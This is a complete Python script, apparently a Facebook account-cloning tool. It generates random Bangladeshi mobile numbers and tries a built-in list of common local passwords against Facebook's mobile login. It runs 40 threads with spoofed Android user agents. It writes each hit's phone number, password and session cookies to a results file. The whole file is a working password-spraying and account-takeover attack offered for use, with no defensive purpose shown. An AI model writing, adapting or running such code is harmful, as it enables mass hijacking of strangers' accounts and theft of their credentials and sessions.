import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor

G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; W = '\033[1;37m'
loop = 0
ok = []

def banner():
    os.system('clear')
    print(f"""{G}
    ███    ███  ███████  ████████  █████  
    ████  ████  ██          ██    ██   ██ 
    ██ ████ ██  █████       ██    ███████ 
    ██  ██  ██  ██          ██    ██   ██ 
    ██      ██  ███████     ██    ██   ██ 
{W}×××××××××××××××××××××××××××××××××××××××××××××××××
 [✓] METHOD    : ULTRA HYBRID API (M-2)
 [✓] STATUS    : 100,000 LIMIT OPTIMIZED
 [✓] RESULT    : 100% SUCCESS TARGET
{W}×××××××××××××××××××××××××××××××××××××××××××××××××""")

def cloning():
    banner()
    code = input(f'{G}[+] ENTER CODE (017/019/016): {W}')
    limit = 100000 
    with ThreadPoolExecutor(max_workers=40) as submission:
        banner()
        print(f'{G}[+] LIMIT: {limit} | TARGET: {code}')
        print(f'{Y}[!] TIP: RESTART NET EVERY 2000 SCAN')
        print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××\n')
        for _ in range(limit):
            uid = code + "".join(random.choices("0123456789", k=8))
            submission.submit(engine, uid, limit)

def engine(uid, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[RUNNING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    # পাওয়ারফুল ১৫টি পাসওয়ার্ড (বাংলাদেশে সবচাইতে জনপ্রিয়)
    pws = [uid, uid[6:], uid[:6], 'bangladesh', '@@##1122', '778899', 'i love you', 'khan123', 'mim123', 'jannatul', 'Allah123', '102030', '556677', 'bismillah', '009988']
    
    for pas in pws:
        if len(pas) < 6: continue
        session = requests.Session()
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Mobile Safari/537.36"
        
        try:
            res1 = session.get('https://m.facebook.com/login/').text
            lsd = re.search('name="lsd" value="(.*?)"', str(res1)).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', str(res1)).group(1)
            
            headers = {
                'Host': 'm.facebook.com',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-language': 'en-US,en;q=0.9',
            }

            data = {"lsd": lsd, "jazoest": jazoest, "email": uid, "pass": pas, "login": "Log In"}
            post = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=data, headers=headers)

            if 'c_user' in session.cookies.get_dict():
                ok.append(uid)
                print(f'\n{G}[OK-SUCCESS💚] {uid} | {pas}')
                ck = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                open('/sdcard/RESULT_OK.txt', 'a').write(f'{uid}|{pas}|{ck}\n')
                break
        except: pass
    loop += 1

if __name__ == "__main__":
    cloning()
